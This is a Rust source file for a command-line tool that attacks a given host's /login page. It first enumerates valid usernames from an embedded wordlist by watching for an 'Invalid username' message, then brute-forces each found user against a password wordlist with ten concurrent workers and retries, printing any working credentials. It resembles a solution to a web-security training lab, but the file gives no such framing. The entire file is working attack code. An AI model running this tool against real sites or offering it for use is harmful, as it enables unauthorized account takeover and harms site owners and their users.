use async_channel::bounded;
use std::{process::exit, sync};

#[tokio::main]
async fn main() {
    let args = std::env::args().collect::<Vec<_>>();
    if args.len() != 2 {
        eprintln!("usage: {} <host>", args[0]);
        exit(1);
    }
    let host = &args[1];

    let users_wordlist = include_str!("../files/users_wordlist.txt")
        .lines()
        .collect::<Vec<_>>();
    let passwords_wordlist = include_str!("../files/passwords_wordlist.txt")
        .lines()
        .collect::<Vec<_>>();

    let valid_users = sync::Arc::new(tokio::sync::Mutex::new(Vec::new()));

    let concurrency = 10;
    let (user_tx, user_rx) = bounded(1);
    let url = format!("https://{}/login", host);

    let mut handles = Vec::new();
    let client = reqwest::Client::new();

    for _ in 0..concurrency {
        let valid_users = valid_users.clone();
        let user_rx = user_rx.clone();
        let url = url.clone();
        let client = client.clone();

        let handle = tokio::spawn(async move {
            while let Ok(user) = user_rx.recv().await {
                let params = [("username", user), ("password", "password")];

                eprintln!("trying user: '{}'", user);
                let mut result = client.post(&url).form(&params).send().await;

                for _retry in 0..3 {
                    if result.is_ok() {
                        break;
                    }

                    eprintln!("retrying...");

                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                    result = client.post(&url).form(&params).send().await
                }

                let Ok(result) = result else {
                    eprintln!("error: {}", result.unwrap_err());
                    exit(1);
                };

                if result.status() != 200 {
                    eprintln!("status: {}", result.status());
                    exit(1);
                }

                let body = result.text().await.unwrap();

                if !body.contains("Invalid username") {
                    println!("user found: {}", user);
                    let mut valid_users = valid_users.lock().await;
                    valid_users.push(user);
                }
            }
        });

        handles.push(handle);
    }

    for user in users_wordlist {
        user_tx.send(user).await.unwrap();
    }

    user_tx.close();

    for handle in handles {
        handle.await.unwrap();
    }

    // Brute force passwords

    let (user_pass_tx, user_pass_rx) = bounded(1);

    let handles = (0..concurrency)
        .map(|_| {
            let user_pass_rx = user_pass_rx.clone();
            let url = url.clone();
            let client = client.clone();

            tokio::spawn(async move {
                while let Ok((user, password)) = user_pass_rx.recv().await {
                    let params = [("username", user), ("password", password)];

                    eprintln!("trying user: '{}' and password: '{}'", user, password);
                    let result = client.post(&url).form(&params).send().await.unwrap();

                    if result.status() != 200 {
                        eprintln!("status: {}", result.status());
                        exit(1);
                    }

                    let body = result.text().await.unwrap();

                    if !body.contains("Incorrect password") {
                        println!("login credentials found: {}:{}", user, password);
                    }
                }
            })
        })
        .collect::<Vec<_>>();

    for &user in valid_users.lock().await.iter() {
        for &password in passwords_wordlist.iter() {
            user_pass_tx.send((user, password)).await.unwrap();
        }
    }

    user_pass_tx.close();

    for handle in handles {
        handle.await.unwrap();
    }
}
